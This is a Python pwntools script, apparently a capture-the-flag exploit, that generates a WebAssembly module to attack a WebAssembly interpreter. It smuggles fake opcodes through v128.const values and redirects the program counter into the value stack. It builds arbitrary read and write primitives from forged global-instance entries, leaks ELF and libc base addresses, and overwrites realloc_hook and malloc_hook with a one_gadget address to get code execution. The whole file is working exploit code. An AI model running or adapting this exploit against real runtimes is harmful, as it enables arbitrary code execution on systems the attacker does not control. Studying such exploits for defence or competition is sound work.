#coding:utf8
from pwn import *
import os

code = '''
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     %s
     nop
     call $_b
     %s
  )

  (func $_b(;2;) (type 0)
     br 0
  )

  (func $_start(;0;) (type 0)
    %s
    call $_a
    %s
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)

)'''



v = 0xffffffff
padding_count = 0x400
payload = ''
jump_pos = 0x179

for i in range(jump_pos):
   payload += 'nop\n'
   payload += 'v128.const i64x2 0x%x 0x%x\n' % (v + (i << 32),v + (i << 32))

payload += 'nop\n'
payload += 'v128.const i64x2 0 0\n' #this fake a IsLast to avoid else opcode popFrame to change our PC again
i += 1
payload += 'nop\n'
payload += 'v128.const i64x2 %d %d\n' % (v + (i << 32),v + (i << 32))
i += 1


def Global_Get(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2300000000 0\n'
   return code

def Global_Set(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2400000000 0\n'
   return code

def i32_const(value):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (value)
   code += 'nop\n'
   code += 'v128.const i64x2 0x4100000000 0\n'
   return code

def i64_const(value):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (value)
   code += 'nop\n'
   code += 'v128.const i64x2 0x4200000000 0\n'
   return code

def i64_add():
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 0 0\n'
   code += 'nop\n'
   code += 'v128.const i64x2 0x7c00000000 0\n'
   return code

def i64_sub():
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 0 0\n'
   code += 'nop\n'
   code += 'v128.const i64x2 0x7d00000000 0\n'
   return code

def v128_const(value1,value2):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d %d\n' % (value1,value2)
   code += 'nop\n'
   code += 'v128.const i64x2 0xfd0c00000000 0\n'
   return code

def i64_store():
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 0 0\n'
   code += 'nop\n'
   code += 'v128.const i64x2 0x3700000000 0\n'
   return code

def v128_load():
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 0 0\n'
   code += 'nop\n'
   code += 'v128.const i64x2 0xfd0000000000 0\n'
   return code

#exploit code

#get GlobInsts vector's memory base address
payload += Global_Get(8)
payload += i64_const(0x1c0)
payload += i64_add()
#store to global for future use
payload += Global_Set(0)
#fake base-0x10 as a GlobInsts Element
payload += Global_Get(0)
payload += i64_const(0x10)
payload += i64_sub()

def arb_read():
   code = Global_Set(8)
   code += Global_Get(12)
   return code

def arb_write():
   code = Global_Set(8)
   code += Global_Set(12)
#leak GlobInsts[0] obj's address
payload += arb_read()
#fake obj-0x10 as a GlobInsts Element
payload += i64_const(0x10)
payload += i64_sub()
#leak obj's vtable
payload += arb_read()
#calc elf_base
payload += i64_const(0x108e50)
payload += i64_sub()
#calc free got
payload += i64_const(0x110940 - 0x10)
payload += i64_add()
#leak free addr
payload += arb_read()
#calc libc_base
payload += i64_const(0x402780)
payload += i64_sub()
#store libc base
payload += Global_Set(0)
#memory align for 128 bit mmop
#realloc_hook - 0x18
payload += Global_Get(0)
payload += i64_const(0x3ebc10)
payload += i64_add()

payload += Global_Set(8)

payload += i32_const(8)
#one_gadget
payload += Global_Get(0)
payload += i64_const(0x10a2fc)
payload += i64_add()
#store value to 0x8
payload += i64_store()
#load it from 0 so the value will in high 64bit
payload += v128_load()

#write realloc_hook to one_gadget,the address is aligned
payload += Global_Set(12)

#_malloc_hook
payload += Global_Get(0)
payload += i64_const(0x3ebc20)
payload += i64_add()
payload += Global_Set(8)
#realloc
payload += Global_Get(0)
payload += i64_const(0x98c50 + 0x9)
payload += i64_add()
#write malloc_hook
payload += Global_Set(12)


print i
while i < padding_count-1:
   payload += 'nop\n'
   payload += 'v128.const i64x2 %d %d\n' % (v + (i << 32),v + (i << 32))
   i += 1

jmp_payload = ''
jmp_payload_count = 0x30
v = 0x11111111
for i in range(jmp_payload_count):
   if i == 0x2a:
      jmp_payload += 'i64.const 0x500000000\n' #fake a else opcode let pc = pc + PC->getJumpEnd(),so pc will in valuestack!!
   elif i == 0x2f:
      jmp_payload += 'i64.const 0\n'
   else:
      jmp_payload += 'i64.const 0x%x\n' % (v + (i << 32))

code = code % (jmp_payload,'drop\n'*jmp_payload_count,payload,'drop\n'*(padding_count))

os.system('rm exp.wat')
f = open('exp.wat','w')
f.write(code)
f.close()

os.system('./wat2wasm --enable-all exp.wat')
